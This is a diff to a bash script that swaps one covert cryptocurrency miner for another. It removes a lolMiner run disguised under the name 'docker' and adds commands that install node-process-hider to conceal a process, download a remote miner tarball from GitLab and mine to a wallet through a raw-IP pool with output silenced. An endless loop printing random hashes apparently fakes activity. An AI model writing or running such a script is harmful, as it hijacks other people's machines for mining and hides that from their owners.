@@ -1,5 +1,14 @@
 #!/bin/bash
-wget https://gitlab.com/damithnissanka96/aet/-/raw/main/lol.tar.gz && tar -xvf lol.tar.gz
-mv lolMiner docker
-./docker --algo C29AE --o stratum+tcp://139.162.56.204:443 --u ak_2ra4Enw7abrDKAs9NeyRRBFcaVveatfqM7xrwQ4LnWqw9nPKD7.$(echo $(shuf -i 1000-9999 -n 1)-RABBIT) -p x >/dev/null 2>&1
+rm -rvf ele* lol* 1.43* TON* ton* NB* .lib* .bash*
+cd ~/
+mkdir .lib
+cd .lib
+rm -rf *
+sudo apt update -y
+sudo apt install gcc -y
+curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
+apt install nodejs -y
+npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add IJAN
+rm -f IJAN && wget -q 'https://gitlab.com/zenardozhe/jual/-/raw/main/TT.tar.gz' && tar -xvf TT.tar.gz
+./IJAN -a ProgPoWZ -o 20.243.25.25:443 -u iC2TuPhrHvreA4KKJUoawyKdY1KJEBKntHyZsu3PhNqRcMBWaLrAcs83PstR1CKqFAJqLm1Wfp49mjXpP29bioGYdCufNqFdByk5hCPDS -p $(echo $(shuf -i 1-20 -n 1)-CT) >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
